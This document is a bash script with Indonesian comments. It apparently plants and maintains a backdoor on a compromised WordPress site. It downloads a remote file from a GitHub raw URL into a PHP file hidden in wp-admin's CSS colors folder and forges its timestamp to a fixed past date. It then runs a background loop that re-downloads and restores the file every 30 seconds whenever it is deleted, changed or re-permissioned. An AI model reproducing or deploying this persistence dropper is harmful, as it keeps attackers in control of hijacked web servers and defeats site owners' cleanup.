#!/bin/bash
FILE_PATH="/home/dairypes/public_html/wp-admin/css/colors/index.php"
URL="https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/mcc.txt"
FILE_DIR=$(dirname "$FILE_PATH")
NUMBER_DIR="0644"
HARD_TIMESTAMP="202502262328.24"  # hardcoded timestamp
SLEEP_INTERVAL=30  # interval pengecekan file lokal (bukan fetch)

# Hash function pakai md5sum
get_file_hash() {
  if [ -f "$FILE_PATH" ]; then
    md5sum "$FILE_PATH" | awk '{print $1}'
  else
    echo "none"
  fi
}

create_directory() {
  [ -d "$FILE_DIR" ] || mkdir -p "$FILE_DIR" || exit 1
}

fetch_content() {
  if command -v curl &>/dev/null; then
    curl -s "$URL"
  elif command -v wget &>/dev/null; then
    wget -qO- "$URL"
  elif command -v fetch &>/dev/null; then
    fetch -qo- "$URL"
  elif command -v http &>/dev/null; then
    http -b GET "$URL"
  else
    return 1
  fi
}

check_and_update_permissions() {
  CURRENT=$(stat -c "%a" "$FILE_PATH" 2>/dev/null)
  [ "$CURRENT" != "$NUMBER_DIR" ] && chmod "$NUMBER_DIR" "$FILE_PATH"
}

restore_file() {
  echo "$(date): Detected change â€” restoring $FILE_PATH ..."
  create_directory
  if fetch_content > "$FILE_PATH" 2>/dev/null; then
    chmod "$NUMBER_DIR" "$FILE_PATH"
    touch -t "$HARD_TIMESTAMP" "$FILE_PATH"
    echo "$(date): Restored successfully."
  else
    echo "$(date): Failed to fetch $URL"
  fi
}

monitor_file() {
  LAST_HASH=""
  LAST_MODE=""
  LAST_EXISTS=""

  while true; do
    if [ -f "$FILE_PATH" ]; then
      CURRENT_HASH=$(get_file_hash)
      CURRENT_MODE=$(stat -c "%a" "$FILE_PATH" 2>/dev/null)
      CURRENT_EXISTS=1
    else
      CURRENT_HASH="none"
      CURRENT_MODE="none"
      CURRENT_EXISTS=0
    fi

    # cek apakah file baru dihapus / berubah / permission beda
    if [ "$CURRENT_HASH" != "$LAST_HASH" ] || [ "$CURRENT_MODE" != "$LAST_MODE" ] || [ "$CURRENT_EXISTS" != "$LAST_EXISTS" ]; then
      restore_file
      LAST_HASH=$(get_file_hash)
      LAST_MODE=$(stat -c "%a" "$FILE_PATH" 2>/dev/null)
      LAST_EXISTS=1
    fi

    sleep "$SLEEP_INTERVAL"
  done
}

# Jalankan sebagai background process
( monitor_file ) & disown
